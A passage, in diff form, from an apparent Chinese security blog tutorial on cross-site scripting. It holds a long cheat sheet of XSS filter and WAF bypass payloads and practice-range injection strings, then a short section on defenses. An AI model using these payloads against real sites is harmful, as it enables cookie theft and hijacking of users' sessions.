+限制 &#39; 符号，输入&lt;img src=1 οnclick=alert(/1/)&gt;、&lt;img src=1 οnclick=&quot;alert(1)&quot;&gt;
+限制 () 符号，输入&lt;img src=1 οnclick=”alert `&#39;1&#39;`&gt;
+限制 () &#39; &quot; 符号，输入&lt;img src=1 onclick=alert `1`&gt;
+</code></pre>
+<h4 id="alert绕过"><a href="#alert绕过" class="headerlink" title="alert绕过"></a>alert绕过</h4><pre><code> (alert)(1)a=alert,a(1)[1].find(alert)top[/al/.source+/ert/.source](1)al\u0065rt(1)top[‘al\145rt’](1)top[8680439..toString(30)](1)
+</code></pre>
+<h4 id="一些绕过语句"><a href="#一些绕过语句" class="headerlink" title="一些绕过语句"></a>一些绕过语句</h4><pre><code>&lt;sVG/x=&quot;&gt;&quot;/oNloaD=confirm()//
+/*-/*`/*\`/*&#39;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
+&lt;lol/onauxclick=[0].some(alert)&gt;rightclick
+&lt;svg onx=() οnlοad=(confirm)(1)&gt;
+&lt;xssBypass/onpointermove=(confirm)(1)&gt;MoveMouseHere
+&lt;svg onx=() οnlοad=(confirm)(1)&gt;
+&lt;img src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240409-205504.png" alt="在这里插入图片描述"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240409-205515.png" alt="在这里插入图片描述"></p>
+<h3 id="XSS绕过-实在不行直接跑总结的payload）"><a href="#XSS绕过-实在不行直接跑总结的payload）" class="headerlink" title="XSS绕过(实在不行直接跑总结的payload）"></a>XSS绕过(实在不行直接跑总结的payload）</h3><pre><code>用 / 代替空格
+&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;
+
+大小写绕过
+&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;
+
+双写关键字
+&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;
+
+字符拼接(利用eval)
+&lt;img src=&quot;x&quot; onerror=&quot;a=aler;b=t;c=&#39;(xss);&#39;;eval(a+b+c)&quot;&gt;
+
+字符拼接(利用top)
+&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;
+
+(alert)(1)
+
+a=alert,a(1)
+
+[1].find(alert)
+
+top[&quot;al&quot;+&quot;ert&quot;](1)
+
+top[/al/.source+/ert/.source](1)
+
+al\u0065rt(1)
+
+top[&#39;al\145rt&#39;](1)
+
+top[8680439..toString(30)](1)
+
+有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了
+&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;
+&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;
+
+因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
+&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(``xss``);&quot;&gt; 
+
+Unicode编码绕过
+&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;
+//转ascii写法
+&lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;
+//转中文写法
+
+url编码绕过
+&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#39;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#39;))&quot;&gt;
+
+&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;
+
+Ascii码绕过
+&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;
+
+Hex绕过
+&lt;img src=x onerror=eval(&#39;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#39;)&gt;
+
+八进制绕过
+&lt;img src=x onerror=alert(&#39;\170\163\163&#39;)&gt;
+
+base64绕过
+&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#39;))&quot;&gt;
+&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;
+
+如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号
+&lt;img src=&quot;x&quot; onerror=alert(`xss`);&gt;
+或者使用编码方式绕过
+
+当括号被过滤的时候可以使用throw来绕过
+&lt;svg/onload=&quot;window.onerror=eval;throw&#39;=alert\x281\x29&#39;;&quot;&gt;
+
+使用url编码
+&lt;img src=&quot;x&quot; onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`&gt;
+
+使用IP
+&lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt;十进制
+&lt;img src=&quot;x&quot; onerror=document.location=`http://0177.0.0.01/`&gt;八进制
+&lt;img src=&quot;x&quot; onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt;十六进制
+
+绕过http://，在html标签中用//可以代替http://
+&lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;
+
+使用中文逗号代替英文逗号
+&lt;img src=&quot;x&quot; onerror=&quot;document.location=`http://www。baidu。com`&quot;&gt;
+//会自动跳转到百度
+</code></pre>
+<h3 id="过滤宝典"><a href="#过滤宝典" class="headerlink" title="过滤宝典"></a>过滤宝典</h3><pre><code>一个地方直接调用url中的相对路径,上去直接一个闭合,后面直接想干什么干什么
+
+闭合
+
+不要忘了``是可以当小括号使用的
+
+svg标签可直接执行实体字符即HTML转义字符，若不添加在前则包含解析script标签内容的编码内容
+
+不区分大小写
+
+复写
+
+javascr&amp;#x69;pt:alert(1) 编码
+
+javascr&amp;#x69;pt:alert(1)//http:// 白名单只要http://
+
+?t_sort=&quot; onmouseover=alert(1) type=&quot;text   发现三个隐藏域只有一个有显示位,所以在url给隐藏域传值,但是因为类型属于hidden,所以我们在创建一个新标签
+
+&quot;onclick =&quot;alert(1)&quot; type=&quot;text   注入点在referer
+
+注入点在cookie
+&quot;onclick =&quot;alert(1)&quot; type=&quot;text
+
+ng-include: 用于包含外部的HTML文件默认需要同域名,所传入到目标页面的HTML实体编码不生效
+需要注意使用ng-include时我们需要用引号把我们的外部连接引起来
+?src=&#39;http://127.0.0.1/xss-labs-master/level1.php?name=&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;xss&#39;
+
+相当于我们在keyword后面新建&lt;a&gt;标签
+测试注入，发现对script、/、空格 进行替换
+?keyword=&lt;a%0Ahref=&#39;javas%0Acript:alert(&quot;xss&quot;)&#39;&gt;xsst
+
+?arg01=a&amp;arg02= onmouseover=alert(1)
+
+HTML注释支持以下两种方式：
+&lt;!-- xxx --&gt;
+&lt;!- xxx -!&gt; &lt;!— 以！开头，以！结尾对称注释的方式 —!&gt;
+
+过滤了auto、大于号&gt;、以on开头=等号结尾，将其替换成_，且忽略大小写。但是没有过滤换行，直接可以换行绕过。
+</code></pre>
+<h2 id="三、xss防御"><a href="#三、xss防御" class="headerlink" title="三、xss防御"></a>三、xss防御</h2><p><strong>只要有输入数据的地方，就可能存在 XSS 危险。永远不相信用户的输入。需要对用户的输入进行处理，只允许输入合法的值，其它值一概过滤掉。</strong></p>
+<p><strong>XSS防御的总体思路是：</strong> 对输入进行过滤，对输出进行编码</p>
+<p>​    1、httpOnly：在 cookie 中设置 HttpOnly 属性后，js脚本将无法读取到 cookie 信息。</p>
+<p>​    2、输入过滤：一般是用于对于输入格式的检查，例如：邮箱，电话号码，用户名，密码……等，按照规定的格式输入。<br>​        不仅仅是前端负责，后端也要做相同的过滤检查。因为攻击者完全可以绕过正常的输入流程，直接利用相关接口向服务器发送设置。</p>
+<p>​    3、转义 HTML：如果拼接 HTML 是必要的，就需要对于url中的引号，尖括号，斜杠进行转义,但这还不是很完善.想对 HTML 模板各处        插入点进行充分的转义,就需要采用合适的转义库。<br>​        例如：·htmlspecialchars()·函数把一些预定义的字符转换为 HTML 实体</p>
+<pre><code>#预定义的字符是：      
+&amp; (和号)   成为 &amp;amp         
+&quot; (双引号) 成为 &amp;quot           
+’ (单引号) 成为 &amp;#039                     
+&lt; (小于)   成为 &amp;lt                    
+&gt; (大于)   成为 &amp;gt
+</code></pre>
+<p>​    4、白名单：对于显示富文本来说，不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。<br>​        这种情况通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用        白名单的方式。</p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34598847/article/details/133894354">XSS与靶场(史上最详细附带payload)_xss靶场-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.kancloud.cn/noahs/src_hacker/2395008">xss案例和修复 · 白帽与安全 · 看云 (kancloud.cn)</a></p>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 剣の魔王の小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;剣の魔王
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    <script>
+        console.info("Welcome to Argvchs' blog!");
+        if (!window.hasOwnProperty("ontouchstart")) {
+            let html = '<canvas id="fireworks" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"></canvas><script src="https://static-argvchs.netlify.app/js/fireworks.min.js"><\/script>';
+            document.body.append(document.createRange().createContextualFragment(html));
+        }
+    </script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="argvchs/giscus-comments"
+    data-repo-id="R_kgDOI_uC-w"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOI_uC-84CUToF"
+    data-mapping="pathname"
+    data-strict="1"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="https://static-argvchs.netlify.app/css/giscus.css"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+</body>
+</html>
